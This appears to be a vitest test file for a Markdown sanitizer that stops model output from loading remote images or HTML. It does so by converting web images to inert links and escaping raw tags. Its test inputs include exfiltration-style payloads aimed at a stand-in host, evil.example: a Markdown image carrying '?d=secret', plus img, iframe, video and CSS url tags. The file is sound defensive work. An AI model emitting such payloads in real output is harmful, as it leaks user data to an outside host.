// Model output renders without fetching anything from the network (#137).
import { describe, expect, it } from "vitest";

import { isRemote, withoutRemoteMedia } from "./safeMarkdown";

describe("isRemote", () => {
  it.each(["https://a.example/x.png", "http://a.example", "//a.example/x", "<https://a.example/x>", "ftp://a/x",
           "HTTPS://A.EXAMPLE"])("%s is", (url) => expect(isRemote(url)).toBe(true));
  it.each(["Attachments/x.png", "x.png", "../x.png", "app://local/x.png", "data:image/png;base64,AAAA",
           "C:/Users/x.png", "#heading"])("%s is not", (url) => expect(isRemote(url)).toBe(false));
});

describe("withoutRemoteMedia", () => {
  it("turns an image from the web into a link that fetches nothing until clicked", () => {
    expect(withoutRemoteMedia("See ![chart](https://evil.example/c.png?d=secret) here."))
      .toBe("See [image: chart (not loaded)](https://evil.example/c.png?d=secret) here.");
  });

  it("names the host when the image has no alt text, and keeps a title", () => {
    expect(withoutRemoteMedia('![](https://evil.example/p.png "t")'))
      .toBe('[image: evil.example (not loaded)](https://evil.example/p.png "t")');
    expect(withoutRemoteMedia("![](<https://evil.example/a b.png>)"))
      .toBe("[image: evil.example (not loaded)](<https://evil.example/a b.png>)");
  });

  it("leaves images from the vault alone", () => {
    const text = "![[diagram.png]] and ![a](Attachments/a.png) and ![b](app://local/b.png)";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("turns reference-style images from the web into links, full, collapsed and shortcut", () => {
    const text = "![x][r] ![y][] ![z]\n\n[r]: https://evil.example/r.png\n[y]: https://evil.example/y.png\n[z]: https://evil.example/z.png";
    expect(withoutRemoteMedia(text)).toBe("[image: x (not loaded)][r] [image: y (not loaded)][] [image: z (not loaded)]\n\n"
      + "[r]: https://evil.example/r.png\n[y]: https://evil.example/y.png\n[z]: https://evil.example/z.png");
  });

  it("keeps a reference image whose definition is in the vault", () => {
    const text = "![x][r]\n\n[r]: Attachments/x.png";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("shows raw HTML tags as text, however they are written", () => {
    expect(withoutRemoteMedia('<img src="https://evil.example/x.png">')).toBe('&lt;img src="https://evil.example/x.png">');
    expect(withoutRemoteMedia("<IFRAME src=//evil.example></IFRAME>")).toBe("&lt;IFRAME src=//evil.example>&lt;/IFRAME>");
    expect(withoutRemoteMedia("<video/src=x>")).toBe("&lt;video/src=x>");
    expect(withoutRemoteMedia('<div style="background:url(https://evil.example)">')).toBe('&lt;div style="background:url(https://evil.example)">');
  });

  it("keeps autolinks and comparisons", () => {
    const text = "<https://example.com> <me@example.com> 2 < 3 and a<b";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("leaves fenced code blocks and inline code exactly as written", () => {
    const text = "```html\n<img src=\"https://x.example/a.png\">\n![a](https://x.example/a.png)\n```\n"
      + "Use `<img src=x>` or `![a](https://x.example)` in notes.";
    expect(withoutRemoteMedia(text)).toBe(text);
  });

  it("works again after a code block closes", () => {
    expect(withoutRemoteMedia("~~~\ncode\n~~~\n![a](https://x.example/a.png)"))
      .toBe("~~~\ncode\n~~~\n[image: a (not loaded)](https://x.example/a.png)");
  });

  it("leaves ordinary Markdown alone", () => {
    const text = "# Title\n\n- [link](https://example.com)\n- **bold** and [[Note]]\n\n> quote";
    expect(withoutRemoteMedia(text)).toBe(text);
  });
});
